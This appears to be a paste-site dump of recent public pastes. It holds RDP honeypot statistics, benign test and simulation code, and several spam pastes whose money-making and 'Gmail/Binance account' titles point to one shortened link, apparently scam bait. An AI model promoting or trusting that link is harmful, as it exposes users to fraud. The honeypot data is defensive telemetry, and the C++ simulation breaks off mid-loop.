id,title,username,language,date,content
zgJ0Z1FC,Make $1000 15-MINUTES (BEGINNER) WM,Xavdsvrfwfrewffsfsd,JavaScript,Tuesday 1st of April 2025 07:19:05 PM CDT," 
Pdf https://tinyurl.com/methodssss


ao6ttSp4ht
"
6zYKKqcU,2025-03-31_stats.json,rdp_snitch,JSON,Tuesday 1st of April 2025 07:18:51 PM CDT,"{
  ""ip"": {
    ""138.199.24.6"": 67896,
    ""156.146.57.110"": 37164,
    ""156.146.57.52"": 9234,
    ""156.146.57.188"": 1497,
    ""156.146.57.174"": 9279,
    ""150.95.89.149"": 9240,
    ""146.190.105.191"": 2532,
    ""217.160.21.137"": 15,
    ""106.14.144.233"": 435,
    ""157.245.156.139"": 3,
    ""188.166.250.11"": 6,
    ""156.146.57.118"": 2121,
    ""185.42.12.5"": 18,
    ""205.210.31.204"": 9,
    ""45.227.254.151"": 6,
    ""45.227.254.155"": 6,
    ""156.146.57.120"": 5607,
    ""157.245.104.150"": 15,
    ""147.185.132.31"": 9,
    ""178.20.129.235"": 3,
    ""167.94.145.104"": 3,
    ""147.182.229.114"": 324,
    ""185.147.124.165"": 18,
    ""205.210.31.151"": 9,
    ""94.131.11.211"": 9,
    ""66.235.169.197"": 6,
    ""118.193.59.10"": 3,
    ""61.219.85.85"": 3,
    ""194.165.16.167"": 6,
    ""134.209.221.100"": 12,
    ""139.177.201.185"": 3,
    ""194.165.16.162"": 6,
    ""103.97.93.115"": 9,
    ""198.235.24.114"": 9
  },
  ""asn"": {
    ""AS60068"": 67896,
    ""AS212238"": 64902,
    ""AS135161"": 9240,
    ""AS14061"": 2892,
    ""AS8560"": 15,
    ""AS37963"": 435,
    ""AS59425"": 18,
    ""AS396982"": 36,
    ""AS267784"": 12,
    ""AS24810"": 3,
    ""AS398705"": 3,
    ""AS49505"": 18,
    ""AS44477"": 9,
    ""AS40244"": 6,
    ""AS135377"": 3,
    ""AS3462"": 3,
    ""AS48721"": 12,
    ""AS63949"": 3,
    ""AS134053"": 9
  },
  ""isp"": {
    ""DataCamp Limited"": 67896,
    ""Datacamp Limited"": 64902,
    ""GMO-Z.COM PTE. LTD."": 9240,
    ""DigitalOcean, LLC"": 2892,
    ""IONOS SE"": 15,
    ""Hangzhou Alibaba Advertising Co"": 435,
    ""Chang Way Technologies Co. Limited"": 18,
    ""Google LLC"": 36,
    ""Flyservers S.A."": 24,
    ""Teleset LLC Nchelny Branch"": 3,
    ""Censys, Inc."": 3,
    ""JSC Selectel"": 18,
    ""Stark Industries Solutions LTD"": 9,
    ""HopOne Internet Corporation"": 6,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Chunghwa Telecom Co., Ltd."": 3,
    ""Akamai Technologies, Inc."": 3,
    ""Ethernet Xpress Pvt. Ltd."": 9
  },
  ""org"": {
    ""Cdn77 SGP"": 67896,
    ""Datacamp Limited"": 64902,
    ""Zcom Thai"": 9240,
    ""DigitalOcean, LLC"": 2886,
    ""Unknown"": 15,
    ""Aliyun Computing Co., LTD"": 435,
    ""Digitalocean"": 6,
    ""Horizon LLC"": 18,
    ""Palo Alto Networks, Inc"": 36,
    ""Xwin Universal LTD"": 12,
    ""Teleset LLC"": 3,
    ""Censys, Inc."": 3,
    ""Almira LLC"": 18,
    ""Stark Industries Solutions LTD"": 9,
    ""Tier.Net Technologies LLC"": 6,
    ""Ucloud Information Technology (hk) Limited"": 3,
    ""Chunghwa Telecom Co. Ltd."": 3,
    ""Flyservers S.A"": 12,
    ""Linode"": 3,
    ""Ethernet Xpress Pvt. Ltd."": 9
  },
  ""regionName"": {
    ""North West"": 132798,
    ""Tokyo"": 9240,
    ""South West"": 2541,
    ""Madrid"": 15,
    ""Shanghai"": 435,
    ""Moscow"": 36,
    ""California"": 360,
    ""Vilnius"": 12,
    ""Karnataka"": 15,
    ""Tatarstan Republic"": 3,
    ""Michigan"": 3,
    ""Drenthe"": 9,
    ""New York"": 6,
    ""Hesse"": 3,
    ""New Taipei City"": 3,
    ""Kaunas"": 12,
    ""New Jersey"": 12,
    ""Georgia"": 3,
    ""Goa"": 9
  },
  ""country"": {
    ""Singapore"": 135339,
    ""Japan"": 9240,
    ""Spain"": 15,
    ""China"": 435,
    ""Russia"": 39,
    ""United States"": 384,
    ""Lithuania"": 24,
    ""India"": 24,
    ""The Netherlands"": 9,
    ""Germany"": 3,
    ""Taiwan"": 3
  },
  ""account"": {
    ""hello"": 145392,
    ""Test"": 42,
    ""McKwXyVcU"": 3,
    ""JcHzZh"": 3,
    ""LRvAEh"": 3,
    ""vCrcpeieA"": 3,
    ""KePovo"": 3,
    ""sypKLp"": 3,
    ""(empty)"": 3,
    ""Domain"": 24,
    ""QYfPXzmxi"": 3,
    ""SmlQOR"": 3,
    ""rZHSkG"": 3,
    ""Administrator"": 3,
    ""nngwygmx"": 12,
    ""beio"": 3,
    ""kFWRTtFSr"": 3,
    ""vMHDzE"": 3,
    ""SUZUGL"": 3
  },
  ""keyboard"": {
    ""Unknown"": 145515
  },
  ""client_build"": {
    ""Unknown"": 145515
  },
  ""client_name"": {
    ""Unknown"": 145515
  },
  ""ip_type"": {
    ""hosting & proxy"": 136107,
    ""hosting"": 9339,
    ""proxy"": 27,
    ""Unknown"": 42
  }
}"
3APRC9wP,2025-03-31_stats.json,rdp_snitch,JSON,Tuesday 1st of April 2025 07:16:28 PM CDT,"{
  ""ip"": {
    ""138.199.24.6"": 67895,
    ""156.146.57.110"": 37163,
    ""156.146.57.52"": 9234,
    ""156.146.57.188"": 1497,
    ""156.146.57.174"": 9279,
    ""150.95.89.149"": 9240,
    ""146.190.105.191"": 2532,
    ""217.160.21.137"": 15,
    ""106.14.144.233"": 435,
    ""157.245.156.139"": 3,
    ""188.166.250.11"": 6,
    ""156.146.57.118"": 2121,
    ""185.42.12.5"": 18,
    ""205.210.31.204"": 9,
    ""45.227.254.151"": 6,
    ""45.227.254.155"": 6,
    ""156.146.57.120"": 5607,
    ""157.245.104.150"": 15,
    ""147.185.132.31"": 9,
    ""178.20.129.235"": 3,
    ""167.94.145.104"": 3,
    ""147.182.229.114"": 324,
    ""185.147.124.165"": 18,
    ""205.210.31.151"": 9,
    ""94.131.11.211"": 9,
    ""66.235.169.197"": 6,
    ""118.193.59.10"": 3,
    ""61.219.85.85"": 3,
    ""194.165.16.167"": 6,
    ""134.209.221.100"": 12,
    ""139.177.201.185"": 3,
    ""194.165.16.162"": 6,
    ""103.97.93.115"": 9,
    ""198.235.24.114"": 9
  },
  ""asn"": {
    ""AS60068"": 67895,
    ""AS212238"": 64901,
    ""AS135161"": 9240,
    ""AS14061"": 2892,
    ""AS8560"": 15,
    ""AS37963"": 435,
    ""AS59425"": 18,
    ""AS396982"": 36,
    ""AS267784"": 12,
    ""AS24810"": 3,
    ""AS398705"": 3,
    ""AS49505"": 18,
    ""AS44477"": 9,
    ""AS40244"": 6,
    ""AS135377"": 3,
    ""AS3462"": 3,
    ""AS48721"": 12,
    ""AS63949"": 3,
    ""AS134053"": 9
  },
  ""isp"": {
    ""DataCamp Limited"": 67895,
    ""Datacamp Limited"": 64901,
    ""GMO-Z.COM PTE. LTD."": 9240,
    ""DigitalOcean, LLC"": 2892,
    ""IONOS SE"": 15,
    ""Hangzhou Alibaba Advertising Co"": 435,
    ""Chang Way Technologies Co. Limited"": 18,
    ""Google LLC"": 36,
    ""Flyservers S.A."": 24,
    ""Teleset LLC Nchelny Branch"": 3,
    ""Censys, Inc."": 3,
    ""JSC Selectel"": 18,
    ""Stark Industries Solutions LTD"": 9,
    ""HopOne Internet Corporation"": 6,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Chunghwa Telecom Co., Ltd."": 3,
    ""Akamai Technologies, Inc."": 3,
    ""Ethernet Xpress Pvt. Ltd."": 9
  },
  ""org"": {
    ""Cdn77 SGP"": 67895,
    ""Datacamp Limited"": 64901,
    ""Zcom Thai"": 9240,
    ""DigitalOcean, LLC"": 2886,
    ""Unknown"": 15,
    ""Aliyun Computing Co., LTD"": 435,
    ""Digitalocean"": 6,
    ""Horizon LLC"": 18,
    ""Palo Alto Networks, Inc"": 36,
    ""Xwin Universal LTD"": 12,
    ""Teleset LLC"": 3,
    ""Censys, Inc."": 3,
    ""Almira LLC"": 18,
    ""Stark Industries Solutions LTD"": 9,
    ""Tier.Net Technologies LLC"": 6,
    ""Ucloud Information Technology (hk) Limited"": 3,
    ""Chunghwa Telecom Co. Ltd."": 3,
    ""Flyservers S.A"": 12,
    ""Linode"": 3,
    ""Ethernet Xpress Pvt. Ltd."": 9
  },
  ""regionName"": {
    ""North West"": 132796,
    ""Tokyo"": 9240,
    ""South West"": 2541,
    ""Madrid"": 15,
    ""Shanghai"": 435,
    ""Moscow"": 36,
    ""California"": 360,
    ""Vilnius"": 12,
    ""Karnataka"": 15,
    ""Tatarstan Republic"": 3,
    ""Michigan"": 3,
    ""Drenthe"": 9,
    ""New York"": 6,
    ""Hesse"": 3,
    ""New Taipei City"": 3,
    ""Kaunas"": 12,
    ""New Jersey"": 12,
    ""Georgia"": 3,
    ""Goa"": 9
  },
  ""country"": {
    ""Singapore"": 135337,
    ""Japan"": 9240,
    ""Spain"": 15,
    ""China"": 435,
    ""Russia"": 39,
    ""United States"": 384,
    ""Lithuania"": 24,
    ""India"": 24,
    ""The Netherlands"": 9,
    ""Germany"": 3,
    ""Taiwan"": 3
  },
  ""account"": {
    ""hello"": 145390,
    ""Test"": 42,
    ""McKwXyVcU"": 3,
    ""JcHzZh"": 3,
    ""LRvAEh"": 3,
    ""vCrcpeieA"": 3,
    ""KePovo"": 3,
    ""sypKLp"": 3,
    ""(empty)"": 3,
    ""Domain"": 24,
    ""QYfPXzmxi"": 3,
    ""SmlQOR"": 3,
    ""rZHSkG"": 3,
    ""Administrator"": 3,
    ""nngwygmx"": 12,
    ""beio"": 3,
    ""kFWRTtFSr"": 3,
    ""vMHDzE"": 3,
    ""SUZUGL"": 3
  },
  ""keyboard"": {
    ""Unknown"": 145513
  },
  ""client_build"": {
    ""Unknown"": 145513
  },
  ""client_name"": {
    ""Unknown"": 145513
  },
  ""ip_type"": {
    ""hosting & proxy"": 136105,
    ""hosting"": 9339,
    ""proxy"": 27,
    ""Unknown"": 42
  }
}"
Neh6PhDH,2025-03-31_stats.json,rdp_snitch,JSON,Tuesday 1st of April 2025 07:15:17 PM CDT,"{
  ""ip"": {
    ""138.199.24.6"": 67894,
    ""156.146.57.110"": 37162,
    ""156.146.57.52"": 9234,
    ""156.146.57.188"": 1497,
    ""156.146.57.174"": 9279,
    ""150.95.89.149"": 9240,
    ""146.190.105.191"": 2532,
    ""217.160.21.137"": 15,
    ""106.14.144.233"": 435,
    ""157.245.156.139"": 3,
    ""188.166.250.11"": 6,
    ""156.146.57.118"": 2121,
    ""185.42.12.5"": 18,
    ""205.210.31.204"": 9,
    ""45.227.254.151"": 6,
    ""45.227.254.155"": 6,
    ""156.146.57.120"": 5607,
    ""157.245.104.150"": 15,
    ""147.185.132.31"": 9,
    ""178.20.129.235"": 3,
    ""167.94.145.104"": 3,
    ""147.182.229.114"": 324,
    ""185.147.124.165"": 18,
    ""205.210.31.151"": 9,
    ""94.131.11.211"": 9,
    ""66.235.169.197"": 6,
    ""118.193.59.10"": 3,
    ""61.219.85.85"": 3,
    ""194.165.16.167"": 6,
    ""134.209.221.100"": 12,
    ""139.177.201.185"": 3,
    ""194.165.16.162"": 6,
    ""103.97.93.115"": 9,
    ""198.235.24.114"": 9
  },
  ""asn"": {
    ""AS60068"": 67894,
    ""AS212238"": 64900,
    ""AS135161"": 9240,
    ""AS14061"": 2892,
    ""AS8560"": 15,
    ""AS37963"": 435,
    ""AS59425"": 18,
    ""AS396982"": 36,
    ""AS267784"": 12,
    ""AS24810"": 3,
    ""AS398705"": 3,
    ""AS49505"": 18,
    ""AS44477"": 9,
    ""AS40244"": 6,
    ""AS135377"": 3,
    ""AS3462"": 3,
    ""AS48721"": 12,
    ""AS63949"": 3,
    ""AS134053"": 9
  },
  ""isp"": {
    ""DataCamp Limited"": 67894,
    ""Datacamp Limited"": 64900,
    ""GMO-Z.COM PTE. LTD."": 9240,
    ""DigitalOcean, LLC"": 2892,
    ""IONOS SE"": 15,
    ""Hangzhou Alibaba Advertising Co"": 435,
    ""Chang Way Technologies Co. Limited"": 18,
    ""Google LLC"": 36,
    ""Flyservers S.A."": 24,
    ""Teleset LLC Nchelny Branch"": 3,
    ""Censys, Inc."": 3,
    ""JSC Selectel"": 18,
    ""Stark Industries Solutions LTD"": 9,
    ""HopOne Internet Corporation"": 6,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Chunghwa Telecom Co., Ltd."": 3,
    ""Akamai Technologies, Inc."": 3,
    ""Ethernet Xpress Pvt. Ltd."": 9
  },
  ""org"": {
    ""Cdn77 SGP"": 67894,
    ""Datacamp Limited"": 64900,
    ""Zcom Thai"": 9240,
    ""DigitalOcean, LLC"": 2886,
    ""Unknown"": 15,
    ""Aliyun Computing Co., LTD"": 435,
    ""Digitalocean"": 6,
    ""Horizon LLC"": 18,
    ""Palo Alto Networks, Inc"": 36,
    ""Xwin Universal LTD"": 12,
    ""Teleset LLC"": 3,
    ""Censys, Inc."": 3,
    ""Almira LLC"": 18,
    ""Stark Industries Solutions LTD"": 9,
    ""Tier.Net Technologies LLC"": 6,
    ""Ucloud Information Technology (hk) Limited"": 3,
    ""Chunghwa Telecom Co. Ltd."": 3,
    ""Flyservers S.A"": 12,
    ""Linode"": 3,
    ""Ethernet Xpress Pvt. Ltd."": 9
  },
  ""regionName"": {
    ""North West"": 132794,
    ""Tokyo"": 9240,
    ""South West"": 2541,
    ""Madrid"": 15,
    ""Shanghai"": 435,
    ""Moscow"": 36,
    ""California"": 360,
    ""Vilnius"": 12,
    ""Karnataka"": 15,
    ""Tatarstan Republic"": 3,
    ""Michigan"": 3,
    ""Drenthe"": 9,
    ""New York"": 6,
    ""Hesse"": 3,
    ""New Taipei City"": 3,
    ""Kaunas"": 12,
    ""New Jersey"": 12,
    ""Georgia"": 3,
    ""Goa"": 9
  },
  ""country"": {
    ""Singapore"": 135335,
    ""Japan"": 9240,
    ""Spain"": 15,
    ""China"": 435,
    ""Russia"": 39,
    ""United States"": 384,
    ""Lithuania"": 24,
    ""India"": 24,
    ""The Netherlands"": 9,
    ""Germany"": 3,
    ""Taiwan"": 3
  },
  ""account"": {
    ""hello"": 145388,
    ""Test"": 42,
    ""McKwXyVcU"": 3,
    ""JcHzZh"": 3,
    ""LRvAEh"": 3,
    ""vCrcpeieA"": 3,
    ""KePovo"": 3,
    ""sypKLp"": 3,
    ""(empty)"": 3,
    ""Domain"": 24,
    ""QYfPXzmxi"": 3,
    ""SmlQOR"": 3,
    ""rZHSkG"": 3,
    ""Administrator"": 3,
    ""nngwygmx"": 12,
    ""beio"": 3,
    ""kFWRTtFSr"": 3,
    ""vMHDzE"": 3,
    ""SUZUGL"": 3
  },
  ""keyboard"": {
    ""Unknown"": 145511
  },
  ""client_build"": {
    ""Unknown"": 145511
  },
  ""client_name"": {
    ""Unknown"": 145511
  },
  ""ip_type"": {
    ""hosting & proxy"": 136103,
    ""hosting"": 9339,
    ""proxy"": 27,
    ""Unknown"": 42
  }
}"
HB5TfWXk,Binance account CW,Xavdsvrfwfrewffsfsd,JavaScript,Tuesday 1st of April 2025 07:03:11 PM CDT," 
Pdf https://tinyurl.com/methodssss


7rMjo5PHed
"
fgtD0DXB,EARN $900 INSTANTLY 2025 BT,Xavdsvrfwfrewffsfsd,JavaScript,Tuesday 1st of April 2025 06:47:10 PM CDT," 
Pdf https://tinyurl.com/methodssss


BMJkHXc98I
"
R7QjsTvt,Random Gmail Acc 1A,Xavdsvrfwfrewffsfsd,JavaScript,Tuesday 1st of April 2025 06:31:15 PM CDT," 
Pdf https://tinyurl.com/methodssss


iDfn4dkkqc
"
UJiq6cRy,users csv export feature test and implementation,4tolexx,GetText,Tuesday 1st of April 2025 06:13:20 PM CDT,"Feature: Export Users as CSV

  Background:
    Given a user ""User 1"" with:
      | id   | 1             |
      | name | Alex Barnsley |
    And a user ""User 2"" with:
      | id   | 2             |
      | name | Phil Thompson |
    And a role ""Authorized"" with permissions:
      | User    | read |
    And user ""User 1"" belongs to role ""Authorized""

  Scenario: Export users list as csv
    When I sign in as user ""User 1""
    And I browse to users list
    Then I see ""User 1""
    And I see ""User 2""
    When I click ""CSV""
    Then I download a CSV with content:
      | Id | Name          | Username | Sign in count | Failed attempts | Last sign in at | Password changed at | Locked at  | Created at | Updated at |
      | 1  | Alex Barnsley | User 1   | <INT>         | <INT>           | <ISO_DATE>      | <ISO_DATE>          | <EMPTY>    | <ISO_DATE> | <ISO_DATE> |
      | 2  | Phil Thompson | User 2   | <INT>         | <INT>           | <EMPTY>         | <ISO_DATE>          | <EMPTY>    | <ISO_DATE> | <ISO_DATE> |


csv do
    column :id
    column(:name) { |user| user.object.name }
    column(:username) { |user| user.object.username }
    column :sign_in_count
    column :last_sign_in_at
    column :failed_attempts
    column :password_changed_at
    column :locked_at
    column :updated_at
    column :created_at
  end
"
f3Fsqgwh,study csv export and implementation,4tolexx,GetText,Tuesday 1st of April 2025 06:05:51 PM CDT,"Feature: Export Studies as CSV

  Background:
    Given a study ""Study 1"" with:
      | id             | 1 		  |
      | state          | building |
      | locked_version | 1 		  |
    And a study ""Study 2"" with:
      | id             | 2 			|
      | state          | production |
      | locked_version | 2 			|

  Scenario: Export studies list as csv
    When I sign in as a user with all permissions
    And I browse to studies list
    Then I see ""Study 1""
    And I see ""Study 2""
    When I click ""CSV""
    Then I download a CSV with content:
      | Id | Name    | State      | Locked version | Created at | Updated at |
      | 1  | Study 1 | building   | 1              | <ISO_DATE> | <ISO_DATE> |
      | 2  | Study 2 | production | 2              | <ISO_DATE> | <ISO_DATE> |


  csv do
    column :id
    column(:name) { |study| study.object.name }
    column(:state) { |study| study.object.state }
    column :locked_version
    column :created_at
    column :updated_at
  end
"
b3MuJrtj,Stargate Controller Test 2,Alexr360,Lua,Tuesday 1st of April 2025 05:47:50 PM CDT,"interface = peripheral.find(""basic_interface"")

function dial(address)
    
    local addressLength = #address
    
    local start = interface.getChevronsEngaged() + 1
    
    for chevron = start, addressLength, 1
    do
        local symbol = address[chevron]
        
        if chevron % 2 == 0 then
            interface.rotateClockwise(symbol)
        else
            interface.rotateAntiClockwise(symbol)
        end
        
        while(not interface.isCurrentSymbol(symbol))
        do
            sleep(0)
        end
        
        sleep(1)
        interface.openChevron()
        sleep(1)

        interface.closeChevron()
        sleep(1)
    end 
end

abydosAddress = {26,6,14,31,11,29,0}

overworldAddress = {27, 25, 4, 35, 10, 28, 0}

cavumAddress = {18, 7, 3, 36, 25, 15, 0}

chulakAddress = {18,14,21,15,2,13,19,35,0}

othersideAddress = {10, 28, 17, 21, 3, 27, 0}

print(""Awaiting input:"")

print(""1 = Abydos"")
print(""2 = Overworld"")
print(""3 = Cavum Tenebrae"")
print(""4 = Chulak"")
print(""5 = Otherside"")

input = tonumber(io.read())
sleep(0)

if input == 1 then
    dial(abydosAddress)
elseif input == 2 then
    dial(overworldAddress)
elseif input == 3 then
    dial(cavumAddress)
elseif input == 4 then
    dial(chulakAddress)
elseif input == 5 then
    dial(othersideAddress)
else
    print(""Invalid input"")
end
"
Ks026LU0,Лаба,Korotkodul,Python,Tuesday 1st of April 2025 05:42:07 PM CDT,"matrix10 = [
[39, 41, 41, 21, 40, 26, 32, 31, 35, 43],
[31, 37, 36, 39, 47, 27, 50, 49, 28, 45],
[31, 37, 41, 40, 34, 37, 42, 22, 36, 34],
[36, 45, 31, 41, 26, 37, 41, 33, 37, 31],
[38, 27, 29, 39, 35, 42, 45, 32, 46, 31],
[21, 26, 37, 47, 32, 38, 45, 32, 36, 24],
[37, 37, 30, 33, 29, 42, 29, 34, 35, 38],
[26, 51, 27, 29, 37, 26, 45, 33, 20, 34],
[44, 45, 28, 33, 37, 31, 41, 43, 41, 33],
[39, 41, 42, 30, 30, 46, 35, 30, 45, 39],
[37, 40, 39, 41, 39, 41, 31, 35, 42, 39],
[33, 37, 42, 40, 36, 29, 42, 32, 32, 29],
[35, 30, 52, 49, 39, 40, 36, 30, 34, 41],
[34, 47, 33, 45, 34, 44, 22, 29, 36, 33],
[32, 30, 17, 38, 34, 32, 35, 38, 31, 35],
[22, 39, 29, 28, 34, 36, 35, 36, 38, 44],
[37, 35, 41, 35, 30, 31, 28, 46, 30, 37],
[48, 40, 44, 41, 40, 33, 36, 32, 38, 22],
[32, 43, 34, 45, 34, 46, 38, 38, 28, 39],
[58, 26, 29, 41, 38, 38, 32, 39, 28, 35],
    ]
#for a in t10:
#    print(a)

matrix40 = [
[80, 62, 66, 63, 78, 68, 75, 74, 99, 73],
[68, 81, 71, 64, 70, 81, 72, 63, 74, 78],
[65, 68, 77, 77, 77, 47, 84, 70, 77, 60],
[74, 63, 71, 63, 73, 77, 56, 63, 78, 59],
[81, 61, 68, 84, 74, 80, 82, 76, 65, 84],
[77, 80, 80, 66, 81, 70, 82, 65, 74, 61],
[69, 101, 79, 66, 80, 81, 81, 78, 51, 69],
[62, 55, 66, 73, 66, 61, 57, 70, 71, 82],
[72, 76, 61, 74, 67, 88, 85, 73, 68, 60],
[75, 79, 80, 76, 67, 84, 70, 76, 71, 63]
    ]
#for a in t40:
#  print(a)

from collections import Counter

t10 = []
for a in matrix10:
  for el in a:
    t10.append(el)

t40 = []
for a in matrix40:
  for el in a:
    t40.append(el)
#print(t10)
#print(t40)

table10 = sorted(Counter(t10).items(), key = lambda x: x[0])
table40 = sorted(Counter(t40).items(), key = lambda x: x[0])

#print(table10)
#print(table40)
print(""TABLE 10"")
for p in table10:
  print(p[0], p[1], p[1] / len(t10))
print()

print(""TABLE 40"")
for p in table40:
  print(p[0], p[1], p[1] / len(t40))
print()"
kE4hsK2L,e-n collisions(v7) - elastic_decay_final,phystota,C++,Tuesday 1st of April 2025 05:30:32 PM CDT,"#include <iostream>
#include <random>
#include <fstream>

#include <math.h>
#include <time.h>
#include <iomanip>  // For std::fixed and std::setprecision

#include <algorithm>  // For std::shuffle
#include <numeric>    // For std::iota


#define n_e 100000
#define Emin 0.0
#define Emax 450.0
#define E_mean 100 // mean electron energy, initial distribution
#define bin_width 0.1 // keep energy step ~ this to maintain cross-section clarity (Ramsauer minimum etc)
#define m_e 9.1E-31 // electron mass in kg
#define k_b 1.38E-23 // Boltzmann constant
#define q 1.602176634E-19 // elementary charge    - eV -> J transfer param
#define N ( (int)((Emax-Emin)/bin_width) ) // add 1 to include E_max if needed?
#define T_n 10.0 // Helium neutral temperature in eV
#define T_e 50.0    // electron Maxwell initial distribution
#define M_n 6.6464731E-27 // Helium atom mass
#define N_He 1000000 // Helium neutrals number
#define Volume 1.0E-12 // Volume to calculate netral density and collision frequency 
#define time 1.0E-4 // 500 microsec time to equalibrate the system

struct Electron {

    //velocity components
    double vx = 0.0;
    double vy = 0.0;
    double vz = 0.0;
    //energy in eV
    double energy = 0.0;
    //Collision flag
    bool collided = false;

    // initializing Maxwell-Boltzmann distribution with T_e
    void initialize(std::mt19937& gen, std::uniform_real_distribution<double>& dis, std::gamma_distribution<double>& maxwell) {

        double R = dis(gen);

        // velocity angles in spherical coordinates
        double phi = 2*M_PI*dis(gen);
        double cosTheta = 2.0*dis(gen) - 1.0;
        double sinTheta = sqrt(1.0 - cosTheta*cosTheta); 

            
        energy = maxwell(gen); // neutrals energies sampled as Maxwell distribution in eV
            
        double speed = sqrt(2*energy*q/m_e);

        //velocity components of neutrals in m/s
        vx = speed * sinTheta * cos(phi);
        vy = speed * sinTheta * sin(phi);
        vz = speed * cosTheta;
    }


};


struct CrossSection {
    double energy;
    double sigma;
};

double interpolate (double energy, const std::vector<CrossSection>& elastic_CS) {


    if (energy < elastic_CS.front().energy) {
        std::cout << "" required energy value lower than range of cross-section data"" << ""\n"";
        return 0.0;
    }
    if (energy > elastic_CS.back().energy) {
        std::cout << "" required energy value higher than range of cross-section data"" << ""\n"";
        return 0.0;        
    }

    int step = 0;   
        while (step < elastic_CS.size() && energy > elastic_CS[step].energy) {
            step++;
        }

    double k = (elastic_CS[step].sigma - elastic_CS[step-1].sigma)/(elastic_CS[step].energy - elastic_CS[step-1].energy);
    double m = elastic_CS[step].sigma - k*elastic_CS[step].energy;
    
    return k*energy + m; 
}


struct NeutralParticle {

    double energy = 0.0;
    double vx = 0.0;
    double vy = 0.0;
    double vz = 0.0;

    void initialize(std::mt19937& gen, std::uniform_real_distribution<double>& dis, std::gamma_distribution<double>& maxwell) {

        double R = dis(gen);

        // velocity angles in spherical coordinates
        double phi = 2*M_PI*dis(gen);
        double cosTheta = 2.0*dis(gen) - 1.0;
        double sinTheta = sqrt(1.0 - cosTheta*cosTheta); 

            
        energy = maxwell(gen); // neutrals energies sampled as Maxwell distribution in eV
            
        double speed = sqrt(2*energy*q/M_n);

        //velocity components of neutrals in m/s
        vx = speed * sinTheta * cos(phi);
        vy = speed * sinTheta * sin(phi);
        vz = speed * cosTheta;
    }
    
};




int main() {

    clock_t start = clock();

    std::vector<Electron> electrons(n_e); // better to use vector instead of simple array as it's dynamically allocated (beneficial for ionization)
    std::vector<NeutralParticle> neutrals(N_He); 


    std::vector<int> histo_random(N, 0); // initialize N size zero-vector for random (initial) histogram
    std::vector<int> histo_maxwell(N, 0); // initialize N size zero-vector for maxwellian histogram
    std::vector<int> histo_neutral(N, 0); // initialize N size zero-vector for neutral distribution histogram

    std::vector<double> elastic_vec(N, 0); // precompiled elastic cross-section-energy vector
    std::vector<double> inelastic1_vec(N, 0); // precompiled inelastic(triplet excitation) cross-section-energy vector

    std::random_device rd; 
    std::mt19937 gen(rd());
    std::uniform_real_distribution<double> dis(0.0, 1.0);
    std::gamma_distribution<double> maxwell_neutral(1.5, T_n);
    std::gamma_distribution<double> maxwell_electron(1.5, T_e);

    std::uniform_int_distribution<int> pair(0, n_e-1);
    std::uniform_int_distribution<int> neutral_pair(0, N_He-1);    


    std::ifstream elastic_cs_dat(""cross_sections/elastic.dat"");
    if (!elastic_cs_dat.is_open()) {
        std::cerr << ""Error opening elastic cross-sections file!"" << std::endl;
        return 1;
    }    

    std::ifstream excitation1_cs_dat(""cross_sections/inelastic_triplet.dat"");
    if (!elastic_cs_dat.is_open()) {
        std::cerr << ""Error opening inelastic triplet cross-sections file!"" << std::endl;
        return 1;
    }   

    // --- starts reading cross section datafiles

    std::vector<CrossSection> elastic_CS_temp;

    double energy, sigma;

    while (elastic_cs_dat >> energy >> sigma) {
        elastic_CS_temp.push_back({energy, sigma});
    }    
    elastic_cs_dat.close();

    energy = 0.0;
    sigma = 0.0;

    std::vector<CrossSection> inelastic1_CS_temp;

    while (excitation1_cs_dat >> energy >> sigma) {
        inelastic1_CS_temp.push_back({energy, sigma});
    }    
    excitation1_cs_dat.close();    

    // --- finish reading cross-section datafiles  

    std::ofstream file0(""velocities.dat"");    
    std::ofstream file1(""energies.dat"");        
    std::ofstream file2(""energies_final.dat"");    
    std::ofstream file3(""histo_random.dat"");    
    file3 << std::fixed << std::setprecision(10);
    
    std::ofstream file4(""histo_maxwell.dat"");
    file4 << std::fixed << std::setprecision(10);           
    
    std::ofstream file5(""neutral_distribution.dat"");    
    std::ofstream file6(""E*f(E).dat"");    
    std::ofstream file7(""nu_max.dat"");
    std::ofstream file8(""electron_mean_energy.dat"");
    std::ofstream file9(""nu.dat"");
    std::ofstream file10(""inelastic_CS_check.dat"");        

    // Initialize all electrons
    for (auto& e : electrons) {
        e.initialize(gen, dis, maxwell_electron);
    }
    // initialize all nenutrals
    for (auto&n : neutrals) {
        n.initialize(gen, dis, maxwell_neutral);
    }
    // precalculate elastic cross-section for each energy bin
    for (int i = 0; i < N; i++){
        elastic_vec[i] = interpolate(bin_width*(i+0.5), elastic_CS_temp);
    }
    // precalculate inelastic cross-section (triplet) for each energy bin
    for (int i = 0; i < N; i++){
        inelastic1_vec[i] = interpolate(bin_width*(i+0.5), inelastic1_CS_temp);
    }

    for (int i = 0; i < n_e; i++){
        file1 << i << "" "" << electrons.at(i).energy << ""\n"";
        file0 << i << "" "" << electrons[i].vx << "" "" << electrons[i].vy << "" "" << electrons[i].vz << ""\n""; 
    }

    // -----initial electrons energy distribution starts------------////
    for (int i = 0; i < n_e; i++){
        int bin = (int)( (electrons[i].energy - Emin)/bin_width );
        if (bin >=0 && bin < histo_random.size())
            histo_random[bin]++;
    }

    for (int i = 0; i < histo_random.size(); i++){
        double bin_center = Emin + (i + 0.5) * bin_width;
        file3 << bin_center << "" "" <<  bin_center*static_cast<double>(histo_random[i])/(electrons.size()*bin_width) << ""\n""; // this is electron normalized distribution function
    }
    // -----initial electrons energy distribution ends------------////    

    // -----neutrals Maxwell-Boltzmann distribution starts------------////
    for (int i = 0; i < N_He; i++){
        int bin = (int)( (neutrals[i].energy - Emin)/bin_width );
        if (bin >=0 && bin < histo_neutral.size())
            histo_neutral[bin]++;
    }    

    for (int i = 0; i < histo_neutral.size(); i++){
        double bin_center = Emin + (i + 0.5) * bin_width;
        file5 << bin_center << "" "" << static_cast<double>(histo_neutral[i])/(neutrals.size()*bin_width) << ""\n""; // this is real f(E) - normalized distribution
        file6 << bin_center << "" "" << bin_center*static_cast<double>(histo_neutral[i])/(neutrals.size()*bin_width) << ""\n""; // this should be E*f(E) 

    }
    // -----neutrals Maxwell-Boltzmann distribution starts------------////       

    // -----calculating nu-max for null-collision method starts ------------////
    double nu_max = 0.0;
    double nu_max_temp = 0.0;
    double sigma_total = 0.0;
    
    for (int i = 0; i < N; i++){
